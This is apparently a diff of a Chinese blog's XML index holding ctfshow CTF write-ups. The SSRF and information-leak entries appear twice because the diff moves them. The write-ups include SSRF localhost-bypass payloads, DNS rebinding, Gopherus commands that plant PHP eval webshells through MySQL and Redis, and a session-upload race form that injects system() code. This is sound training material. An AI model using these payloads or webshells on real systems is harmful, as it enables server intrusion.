-<p><code>@</code> 的作用</p>
-<p>在 URL 中，<code>@</code> 的作用是明确地将用户名和密码与主机名区分开。它的语法格式为：</p>
-<p>用户名:密码@主机名</p>
-<h1>web351</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line">url=file://var/www/html/flag.php</span><br></pre></td></tr></table></figure>
-<h1>web352</h1>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line">  url=http:<span class="comment">//0x7F.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line">八进制</span><br><span class="line">  url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span> 进制整数格式</span><br><span class="line">  url=http:<span class="comment">//2130706433/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="number">0</span>x</span><br><span class="line">  url=http:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"></span><br><span class="line">还有一种特殊的省略模式</span><br><span class="line">  <span class="number">127.0</span>.<span class="number">0.1</span>写成<span class="number">127.1</span></span><br><span class="line"></span><br><span class="line">用CIDR绕过localhost</span><br><span class="line">  url=http:<span class="comment">//127.127.127.127/flag.php</span></span><br><span class="line"></span><br><span class="line">还有很多方式</span><br><span class="line">  url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">  url=http:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1>web353</h1>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">url=http:<span class="comment">//127.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0x7f.0.0.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
-<h1>web354</h1>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">奇淫巧技：将域名A类指向<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="title function_ invoke__">http</span>(s):<span class="comment">//sudo.cc/指向127.0.0.1</span></span><br><span class="line"></span><br><span class="line">url=http:<span class="comment">//sudo.cc/flag.php</span></span><br><span class="line"></span><br><span class="line">也可以跳转到一个自己搭建的网站，再通过自己网站的自动跳转</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># POST: url=http://your-domain/ssrf.php</span></span><br></pre></td></tr></table></figure>
-<h1>web355</h1>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line"><span class="number">127.1</span></span><br></pre></td></tr></table></figure>
-<h1>web356</h1>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br></pre></td></tr></table></figure>
-<h1>web357</h1>
-<p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a></p>
-<p><img src="image-20250304203200017.png" alt="image-20250304203200017"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//7f000001.01010117.rbndr.us/flag.php</span></span><br></pre></td></tr></table></figure>
-<h1>web358</h1>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//ctf.@127.0.0.1/flag.php?show</span></span><br></pre></td></tr></table></figure>
-<h1>web359</h1>
-<p>这题用到Gopher，链接如下(必看)</p>
-<p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRF利用协议中的万金油——Gopher</a></p>
-<p>Gopher介绍</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher协议及其应用</span><br><span class="line">【网络安全 | HTTP】 gopher协议原理、语法及利用总结-CSDN …</span><br><span class="line">https://blog.csdn.net/2301_77485708/article/details/132052102</span><br><span class="line">gopher协议的利用 - FreeBuf网络安全行业门户</span><br><span class="line">https://www.freebuf.com/articles/web/337824.html</span><br><span class="line">SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客</span><br><span class="line">https://blog.csdn.net/qq_50854662/article/details/129180268</span><br><span class="line"></span><br><span class="line">Gopher协议是一种早期的互联网协议，主要用于在网络上获取文本信息。它在1991年提出，设计目的是提供一种简单且高效的方式来浏览和访问文件。Gopher协议通过类似文件系统的层次结构来组织数据，每个项目都有一个唯一的标识符。用户可以通过Gopher客户端软件浏览目录，选择下载或查看文件。Gopher服务器能够提供文本文件、图像文件、二进制文件等多种类型的文件。</span><br><span class="line"></span><br><span class="line">与HTTP相比，Gopher协议具有更简单的设计和较少的功能，它基于传输控制协议（TCP）进行通信，默认端口号为70。然而，随着万维网的崛起和HTTP的普及，Gopher协议逐渐被取代。</span><br><span class="line"></span><br><span class="line">Gopher协议的利用</span><br><span class="line"></span><br><span class="line">Gopher协议可以被用来攻击内网的Redis、Mysql、FastCGI、Ftp等服务，也可以发送GET、POST请求，这样可以拓宽SSRF（服务器端请求伪造）的攻击面。例如，当SSRF无法通过HTTP协议传递POST数据时，可以使用Gopher协议来发起POST请求。</span><br><span class="line"></span><br><span class="line">Gopher协议的语法</span><br><span class="line"></span><br><span class="line">Gopher协议的格式通常为：</span><br><span class="line"></span><br><span class="line">gopher://hostname:port/请求方法(get、post等)/path</span><br><span class="line">其中，hostname表示Gopher服务器的主机名或IP地址，port表示Gopher服务器监听的端口号（默认为70），path则是资源的路径。例如，要请求Gopher服务器上的/example/file.txt文本文件，可以使用上述格式的URL。</span><br><span class="line"></span><br><span class="line">Gopher协议在SSRF攻击中的应用</span><br><span class="line"></span><br><span class="line">在SSRF攻击场景中，利用Gopher协议可以实现多个数据包的整合发送。这种方法可以用于攻击内网的FTP、Telnet、Redis、Memcache等服务。Gopher协议的强大之处在于它可以通过构造特定的请求，来执行对内网服务的攻击，例如写入定时任务或SSH公钥，甚至是执行SQL语句来写入Webshell。</span><br><span class="line">Gopher协议在各个编程语言中的支持情况不同，例如PHP需要--with-curlwrappers且版本至少为5.3，Java版本小于JDK1.7，而Curl的低版本不支持Gopher协议</span><br><span class="line"></span><br><span class="line">结论</span><br><span class="line"></span><br><span class="line">Gopher协议虽然在现代互联网中已不常用，但在网络安全领域，它仍然是一个强大的工具。它的简单性和灵活性使得它在特定的攻击场景中非常有用，尤其是在SSRF攻击中扩展攻击面。因此，了解Gopher协议的工作原理和应用方式对于网络安全防范至关重要</span><br></pre></td></tr></table></figure>
-<p>根据我的理解，gopher可以写入文件。</p>
-<p>进去之后是一个登录界面，sql没有用、弱口令也没有用，抓包之后发现有一个returl=…，修改也没有用。</p>
-<p>wp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载gopher</span><br><span class="line">git clone https://github.com/tarunkant/Gopherus.git</span><br><span class="line">cd Gopherus</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line">username:root</span><br><span class="line">写入一句话木马</span><br><span class="line">select &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br></pre></td></tr></table></figure>
-<p>之后可以访问2.php然后getshell，最终拿flag</p>
-<h1>web360</h1>
-<p>和上面差不多</p>
-<p>差别：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br><span class="line">PHPShell</span><br><span class="line">ctfshow</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>ssrf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web1-10</title>
     <url>/2025/01/19/web1-10/</url>
     <content><![CDATA[<h1>Web1:</h1>
@@ -1061,6 +1039,134 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
 <p>3.网站主页源码文件名称为www.zip。/www.zip对网站主页源码进行下载,然后进行解压。本地看过之后在url进行操作</p>
 <p>4.在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn或者.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
 <p>5.vim缓存信息泄露，/index.php.swp</p>
+]]></content>
+      <tags>
+        <tag>ctfshow_web_命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ssrf</title>
+    <url>/2025/03/05/ssrf/</url>
+    <content><![CDATA[<h1>ssrf漏洞介绍</h1>
+<p>我们可以通过外网连到服务器。服务器可以访问内部网络。</p>
+<p>我们可以通过外网以服务器为媒介访问内部网络。</p>
+<p><code>parse_url()</code> 是 PHP 中的一个内置函数，用于解析一个 URL 并将其分解为各个组成部分，例如协议（scheme）、主机名（host）、端口（port）、路径（path）、查询字符串（query）和锚点（fragment）等。</p>
+<h1>parse_url()</h1>
+<p><img src="image-20250304195640159.png" alt="image-20250304195640159"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">						 <span class="title function_ invoke__">parse_url</span>()  </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//</span><br><span class="line">    [user] =&gt; username			@前</span><br><span class="line">    [pass] =&gt; password			@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>
+<p><code>@</code> 的作用</p>
+<p>在 URL 中，<code>@</code> 的作用是明确地将用户名和密码与主机名区分开。它的语法格式为：</p>
+<p>用户名:密码@主机名</p>
+<h1>web351</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line">url=file://var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+<h1>web352</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line">  url=http:<span class="comment">//0x7F.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line">八进制</span><br><span class="line">  url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span> 进制整数格式</span><br><span class="line">  url=http:<span class="comment">//2130706433/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="number">0</span>x</span><br><span class="line">  url=http:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"></span><br><span class="line">还有一种特殊的省略模式</span><br><span class="line">  <span class="number">127.0</span>.<span class="number">0.1</span>写成<span class="number">127.1</span></span><br><span class="line"></span><br><span class="line">用CIDR绕过localhost</span><br><span class="line">  url=http:<span class="comment">//127.127.127.127/flag.php</span></span><br><span class="line"></span><br><span class="line">还有很多方式</span><br><span class="line">  url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">  url=http:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1>web353</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">url=http:<span class="comment">//127.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0x7f.0.0.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
+<h1>web354</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">奇淫巧技：将域名A类指向<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="title function_ invoke__">http</span>(s):<span class="comment">//sudo.cc/指向127.0.0.1</span></span><br><span class="line"></span><br><span class="line">url=http:<span class="comment">//sudo.cc/flag.php</span></span><br><span class="line"></span><br><span class="line">也可以跳转到一个自己搭建的网站，再通过自己网站的自动跳转</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># POST: url=http://your-domain/ssrf.php</span></span><br></pre></td></tr></table></figure>
+<h1>web355</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line"><span class="number">127.1</span></span><br></pre></td></tr></table></figure>
+<h1>web356</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br></pre></td></tr></table></figure>
+<h1>web357</h1>
+<p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a></p>
+<p><img src="image-20250304203200017.png" alt="image-20250304203200017"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//7f000001.01010117.rbndr.us/flag.php</span></span><br></pre></td></tr></table></figure>
+<h1>web358</h1>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//ctf.@127.0.0.1/flag.php?show</span></span><br></pre></td></tr></table></figure>
+<h1>web359</h1>
+<p>这题用到Gopher，链接如下(必看)</p>
+<p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">SSRF利用协议中的万金油——Gopher</a></p>
+<p>Gopher介绍</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher协议及其应用</span><br><span class="line">【网络安全 | HTTP】 gopher协议原理、语法及利用总结-CSDN …</span><br><span class="line">https://blog.csdn.net/2301_77485708/article/details/132052102</span><br><span class="line">gopher协议的利用 - FreeBuf网络安全行业门户</span><br><span class="line">https://www.freebuf.com/articles/web/337824.html</span><br><span class="line">SSRF利用协议中的万金油——Gopher_dict协议-CSDN博客</span><br><span class="line">https://blog.csdn.net/qq_50854662/article/details/129180268</span><br><span class="line"></span><br><span class="line">Gopher协议是一种早期的互联网协议，主要用于在网络上获取文本信息。它在1991年提出，设计目的是提供一种简单且高效的方式来浏览和访问文件。Gopher协议通过类似文件系统的层次结构来组织数据，每个项目都有一个唯一的标识符。用户可以通过Gopher客户端软件浏览目录，选择下载或查看文件。Gopher服务器能够提供文本文件、图像文件、二进制文件等多种类型的文件。</span><br><span class="line"></span><br><span class="line">与HTTP相比，Gopher协议具有更简单的设计和较少的功能，它基于传输控制协议（TCP）进行通信，默认端口号为70。然而，随着万维网的崛起和HTTP的普及，Gopher协议逐渐被取代。</span><br><span class="line"></span><br><span class="line">Gopher协议的利用</span><br><span class="line"></span><br><span class="line">Gopher协议可以被用来攻击内网的Redis、Mysql、FastCGI、Ftp等服务，也可以发送GET、POST请求，这样可以拓宽SSRF（服务器端请求伪造）的攻击面。例如，当SSRF无法通过HTTP协议传递POST数据时，可以使用Gopher协议来发起POST请求。</span><br><span class="line"></span><br><span class="line">Gopher协议的语法</span><br><span class="line"></span><br><span class="line">Gopher协议的格式通常为：</span><br><span class="line"></span><br><span class="line">gopher://hostname:port/请求方法(get、post等)/path</span><br><span class="line">其中，hostname表示Gopher服务器的主机名或IP地址，port表示Gopher服务器监听的端口号（默认为70），path则是资源的路径。例如，要请求Gopher服务器上的/example/file.txt文本文件，可以使用上述格式的URL。</span><br><span class="line"></span><br><span class="line">Gopher协议在SSRF攻击中的应用</span><br><span class="line"></span><br><span class="line">在SSRF攻击场景中，利用Gopher协议可以实现多个数据包的整合发送。这种方法可以用于攻击内网的FTP、Telnet、Redis、Memcache等服务。Gopher协议的强大之处在于它可以通过构造特定的请求，来执行对内网服务的攻击，例如写入定时任务或SSH公钥，甚至是执行SQL语句来写入Webshell。</span><br><span class="line">Gopher协议在各个编程语言中的支持情况不同，例如PHP需要--with-curlwrappers且版本至少为5.3，Java版本小于JDK1.7，而Curl的低版本不支持Gopher协议</span><br><span class="line"></span><br><span class="line">结论</span><br><span class="line"></span><br><span class="line">Gopher协议虽然在现代互联网中已不常用，但在网络安全领域，它仍然是一个强大的工具。它的简单性和灵活性使得它在特定的攻击场景中非常有用，尤其是在SSRF攻击中扩展攻击面。因此，了解Gopher协议的工作原理和应用方式对于网络安全防范至关重要</span><br></pre></td></tr></table></figure>
+<p>根据我的理解，gopher可以写入文件。</p>
+<p>进去之后是一个登录界面，sql没有用、弱口令也没有用，抓包之后发现有一个returl=…，修改也没有用。</p>
+<p>wp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载gopher</span><br><span class="line">git clone https://github.com/tarunkant/Gopherus.git</span><br><span class="line">cd Gopherus</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line">username:root</span><br><span class="line">写入一句话木马</span><br><span class="line">select &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/2.php&#x27;;</span><br></pre></td></tr></table></figure>
+<p>之后可以访问2.php然后getshell，最终拿flag</p>
+<h1>web360</h1>
+<p>和上面差不多</p>
+<p>差别：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br><span class="line">PHPShell</span><br><span class="line">ctfshow</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>ssrf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web12-20</title>
+    <url>/2025/01/19/web12-20/</url>
+    <content><![CDATA[<h1>Web12</h1>
+<p>提示:有时候网站上的公开信息，就是管理员常用密码</p>
+<p>主要考察收集信息和大胆猜测的能力</p>
+<p>Robots.txt</p>
+<p>/admin/</p>
+<p>User:admin</p>
+<p>Passwd:372619038(在页面的最下面)</p>
+<p>ctfshow{5fae3c78-7d0c-4749-ba24-fa0a6bbe9cdd}</p>
+<h1>Web13</h1>
+<p>提示;技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
+<p>页面下面的document点进去出现账号密码和url</p>
+<p>ctfshow{eb6944f6-439f-40a9-bdb2-1b15750377d8}</p>
+<h1>Web14</h1>
+<p>提示:有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
+<p>我们看源码，搜索editor发现是一个图片，再通过wp进入了editor</p>
+<p>联想到：页面的设计编辑当中出现的图片是通过一个画图工具显示的，那么这个画图工具一定可以查看当前所有目录。</p>
+<p>那么，我们就把flag所在的目录搞到url就可以</p>
+<p>Wp说的原理</p>
+<p><img src="wps8.jpg" alt="img"></p>
+<h1>Web15</h1>
+<p>提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
+<p>这道题我们可以通过utl/admin进入后台，然后账号应该是admin，密码不知道，但是重置密码里面可以重置，但是要重置密码需要作者所居住的城市，我们可以通过页面下面作者的qq邮箱搜索他的qq（25.1.16截至今天已经搜不到了），不过不妨碍做题，是西安，密码重置了之后登录进去</p>
+<p>ctfshow{d95e4ba6-fa90-40ee-9835-f68407fb8f9b}</p>
+<h1>Web16</h1>
+<p>提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
+<p>PHP探针：php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。输入URL/tz.php 即可打开雅黑PHP探针</p>
+<p><img src="wps9.jpg" alt="img"></p>
+<p>点进phpinfo，查看php信息，然后搜索ctf</p>
+<p>ctfshow{1b1ba394-e6ac-40fa-a0a2-aec94f57f917}</p>
+<h1>Web17</h1>
+<p>提示：备份的sql文件会泄露敏感信息</p>
+<p>Url/backup.sql</p>
+<p>ctfshow{dfca4269-062e-4c5f-9140-3de1758c32a5}</p>
+<h1>Web18</h1>
+<p>游戏题，太好了，我是傻逼，就喜欢这种题</p>
+<p>查看js文件，找目标</p>
+<p>if(score&gt;100)</p>
+<p>{</p>
+<p>var result=window.confirm(“\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b”);</p>
+<p>}</p>
+<p>复制里边的东西，然后运行</p>
+<p><img src="wps10.jpg" alt="img"></p>
+<p>去看看url/110.php</p>
+<p>ctfshow{0869ea96-75f4-4b14-87cd-48e8f6d4cce1}</p>
+<h1>Web19</h1>
+<p>提示：密钥什么的，就不要放在前端了</p>
+<p><img src="wps11.jpg" alt="img"></p>
+<p>用hackebar</p>
+<p>方法一：Username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p>
+<p>在原来的登录界面不行，因为没有解密啥的（后来知道他是在登录界面又加密了一下，所以要解密一下源码里面的），但是为啥在hackbar的post就可以</p>
+<p>方法二：</p>
+<p>解码然后在登录界面提交</p>
+<p>这是什么解码？复制给ai问ai</p>
+<p>解出来是</p>
+<p>i_want_a_36d_girl</p>
+<p>出题人脑子也纯有冰</p>
+<p>ctfshow{c155ec3f-a3e9-44dc-84d6-03cd726e5751}</p>
+<h1>Web20</h1>
+<p>提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
+<p>url/db/db.mdb下载文件</p>
+<p>flag{ctfshow_old_database}</p>
+<h1>12-20总结</h1>
+<p>1.后台登录界面url/robots.txt</p>
+<p>2.尾页documen里面会有账号密码之类的<br>
+3.网页图片editor浏览所有文件<br>
+4.Php探针，url/tz.php然后就是进去phpinfo<br>
+5.sql文件泄露url/backup.sql<br>
+6.游戏找js文件<br>
+7.密钥类的用hackbar或者自行ai解码</p>
 ]]></content>
       <tags>
         <tag>ctfshow_web_命令执行</tag>
@@ -1288,83 +1394,6 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
       </tags>
   </entry>
   <entry>
-    <title>web12-20</title>
-    <url>/2025/01/19/web12-20/</url>
-    <content><![CDATA[<h1>Web12</h1>
-<p>提示:有时候网站上的公开信息，就是管理员常用密码</p>
-<p>主要考察收集信息和大胆猜测的能力</p>
-<p>Robots.txt</p>
-<p>/admin/</p>
-<p>User:admin</p>
-<p>Passwd:372619038(在页面的最下面)</p>
-<p>ctfshow{5fae3c78-7d0c-4749-ba24-fa0a6bbe9cdd}</p>
-<h1>Web13</h1>
-<p>提示;技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
-<p>页面下面的document点进去出现账号密码和url</p>
-<p>ctfshow{eb6944f6-439f-40a9-bdb2-1b15750377d8}</p>
-<h1>Web14</h1>
-<p>提示:有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
-<p>我们看源码，搜索editor发现是一个图片，再通过wp进入了editor</p>
-<p>联想到：页面的设计编辑当中出现的图片是通过一个画图工具显示的，那么这个画图工具一定可以查看当前所有目录。</p>
-<p>那么，我们就把flag所在的目录搞到url就可以</p>
-<p>Wp说的原理</p>
-<p><img src="wps8.jpg" alt="img"></p>
-<h1>Web15</h1>
-<p>提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
-<p>这道题我们可以通过utl/admin进入后台，然后账号应该是admin，密码不知道，但是重置密码里面可以重置，但是要重置密码需要作者所居住的城市，我们可以通过页面下面作者的qq邮箱搜索他的qq（25.1.16截至今天已经搜不到了），不过不妨碍做题，是西安，密码重置了之后登录进去</p>
-<p>ctfshow{d95e4ba6-fa90-40ee-9835-f68407fb8f9b}</p>
-<h1>Web16</h1>
-<p>提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
-<p>PHP探针：php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。输入URL/tz.php 即可打开雅黑PHP探针</p>
-<p><img src="wps9.jpg" alt="img"></p>
-<p>点进phpinfo，查看php信息，然后搜索ctf</p>
-<p>ctfshow{1b1ba394-e6ac-40fa-a0a2-aec94f57f917}</p>
-<h1>Web17</h1>
-<p>提示：备份的sql文件会泄露敏感信息</p>
-<p>Url/backup.sql</p>
-<p>ctfshow{dfca4269-062e-4c5f-9140-3de1758c32a5}</p>
-<h1>Web18</h1>
-<p>游戏题，太好了，我是傻逼，就喜欢这种题</p>
-<p>查看js文件，找目标</p>
-<p>if(score&gt;100)</p>
-<p>{</p>
-<p>var result=window.confirm(“\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b”);</p>
-<p>}</p>
-<p>复制里边的东西，然后运行</p>
-<p><img src="wps10.jpg" alt="img"></p>
-<p>去看看url/110.php</p>
-<p>ctfshow{0869ea96-75f4-4b14-87cd-48e8f6d4cce1}</p>
-<h1>Web19</h1>
-<p>提示：密钥什么的，就不要放在前端了</p>
-<p><img src="wps11.jpg" alt="img"></p>
-<p>用hackebar</p>
-<p>方法一：Username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p>
-<p>在原来的登录界面不行，因为没有解密啥的（后来知道他是在登录界面又加密了一下，所以要解密一下源码里面的），但是为啥在hackbar的post就可以</p>
-<p>方法二：</p>
-<p>解码然后在登录界面提交</p>
-<p>这是什么解码？复制给ai问ai</p>
-<p>解出来是</p>
-<p>i_want_a_36d_girl</p>
-<p>出题人脑子也纯有冰</p>
-<p>ctfshow{c155ec3f-a3e9-44dc-84d6-03cd726e5751}</p>
-<h1>Web20</h1>
-<p>提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
-<p>url/db/db.mdb下载文件</p>
-<p>flag{ctfshow_old_database}</p>
-<h1>12-20总结</h1>
-<p>1.后台登录界面url/robots.txt</p>
-<p>2.尾页documen里面会有账号密码之类的<br>
-3.网页图片editor浏览所有文件<br>
-4.Php探针，url/tz.php然后就是进去phpinfo<br>
-5.sql文件泄露url/backup.sql<br>
-6.游戏找js文件<br>
-7.密钥类的用hackbar或者自行ai解码</p>
-]]></content>
-      <tags>
-        <tag>ctfshow_web_命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web21-30</title>
     <url>/2025/01/19/web21-30/</url>
     <content><![CDATA[<h1><strong>Web21</strong></h1>
@@ -1539,6 +1568,50 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
 ]]></content>
       <tags>
         <tag>ctfshow_web_命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web82-86竞争</title>
+    <url>/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/</url>
+    <content><![CDATA[<h1>web82</h1>
+<p>在cookie中设置PHPSESSID（即session 的值）=flag，那么会在服务器上创建一个/tmp/sess_flag文件，对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。<br>
+首先我们需要编写以下html脚本，进行临时文件上传，上传文件的同时传入一个参数及其值:PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls'); ?>，这样达到<a href="https://so.csdn.net/so/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;spm=1001.2101.3001.7020">恶意代码</a>的上传，进而执行命令。  注：记得修改url为你做题的网址</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://04485255-5dd1-4cb0-a34a-e59b3e194b81.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span 